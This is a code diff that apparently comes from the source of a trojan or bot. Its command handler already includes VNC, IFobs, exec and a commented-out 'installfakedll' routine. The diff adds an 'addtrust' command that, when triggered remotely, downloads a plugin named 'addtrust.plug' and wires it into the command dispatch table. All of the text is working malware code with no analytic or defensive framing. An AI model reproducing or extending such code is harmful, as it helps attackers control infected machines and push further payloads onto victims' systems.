@@ -1123,6 +1123,24 @@ bool ExecuteExec(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	}
 }
 
+DWORD WINAPI ThreadAddTrust( char* nameFile )
+{
+	BYTE* data = 0;
+	DWORD size = 0;
+	data = Plugin::Download( "addtrust.plug", 0, &size, false );
+	if( data )
+	{
+		TASKDBG( "AddTrust", "Загрузили addtrust.plug" );
+	}
+	return 0;
+}
+
+bool ExecuteAddTrust(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+	RunThread( ThreadAddTrust, Args );
+	return true;
+}
+
 /*
 
 // Тело потока команды installfakedll
@@ -1243,8 +1261,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandIFobs[]		 = {'i','f', 'o', 'b', 's', 0};
 	const static char CommandLF[]			 = {'l','f',0};
 	const static char CommandExec[]			 = {'e','x','e','c',0};
+	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
 
-	int Index = StrIndexOf( Command, false, 14,
+	int Index = StrIndexOf( Command, false, 15,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1258,7 +1277,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandVNC,
 							(PCHAR)CommandIFobs,
 							(PCHAR)CommandLF,
-							(PCHAR)CommandExec
+							(PCHAR)CommandExec,
+							(PCHAR)CommandAddTrust
 						  );
 
 
@@ -1278,6 +1298,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 11: return ExecuteIFobs;
 		case 12: return ExecuteLF;
 		case 13: return ExecuteExec;
+		case 14: return ExecuteAddTrust;
 
     default: ;
 	}
